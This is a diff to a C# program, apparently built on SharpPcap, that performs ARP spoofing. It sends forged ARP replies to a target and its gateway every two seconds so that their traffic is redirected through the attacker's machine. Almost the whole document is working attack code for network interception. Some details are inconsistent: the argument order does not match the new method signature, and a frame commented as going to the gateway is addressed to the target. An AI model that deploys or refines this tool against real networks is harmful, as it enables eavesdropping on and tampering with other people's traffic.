@@ -48,11 +48,11 @@ class Program
         targetMac = GetMacFromIp(device, targetIp);
         gatewayMac = GetMacFromIp(device, gatewayIp);
         Console.WriteLine("Gateway MAC: {0}", gatewayMac);
-        Console.WriteLine("Target MAC: {0}", gatewayMac);
+        Console.WriteLine("Target MAC: {0}", targetMac);
 
         while (true)
         {
-            Spoof(device, PhysicalAddress.Parse(gatewayMac), PhysicalAddress.Parse(targetMac));
+            Spoof(device, targetIp, PhysicalAddress.Parse(gatewayMac), PhysicalAddress.Parse(targetMac));
             Thread.Sleep(2000);
         }
     }
@@ -108,22 +108,35 @@ class Program
         return string.IsNullOrEmpty(targetMac) ? null : FormatedMac(PhysicalAddress.Parse(targetMac));
     }
 
-    static void Spoof(ILiveDevice device, PhysicalAddress targetMac, PhysicalAddress gatewayMac)
+    static void Spoof(ILiveDevice device, IPAddress targetIp, PhysicalAddress targetMac, PhysicalAddress gatewayMac)
     {
-        var arpRequest = new ArpPacket(
-            ArpOperation.Request,
+        var arpRequestToGateway = new ArpPacket(
+            ArpOperation.Response,
+            device.MacAddress,
+            targetIp,
             gatewayMac,
-            gatewayIp,
-            targetMac,
             gatewayIp
         );
 
-        var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
-        ethernetPacket.PayloadPacket = arpRequest;
+        var arpRequestToTarget = new ArpPacket(
+            ArpOperation.Response,
+            device.MacAddress,
+            gatewayIp,
+            targetMac,
+            targetIp
+        );
 
+        // Sent to gateway
+        var ethernetPacket = new EthernetPacket(device.MacAddress, targetMac, EthernetType.Arp);
+        ethernetPacket.PayloadPacket = arpRequestToGateway;
         device.SendPacket(ethernetPacket);
 
-        Console.WriteLine($"* Spoofed * {gatewayIp} -> {targetMac}");
+        // Sent to target
+        ethernetPacket.PayloadPacket = arpRequestToTarget;
+        device.SendPacket(ethernetPacket);
+
+        Console.WriteLine($"Sent ARP reply to target: {targetIp} -> {FormatedMac(targetMac)}");
+        Console.WriteLine($"* Spoofed * {gatewayIp} -> {FormatedMac(targetMac)}");
     }
 
     // Format MAC ADDRESS
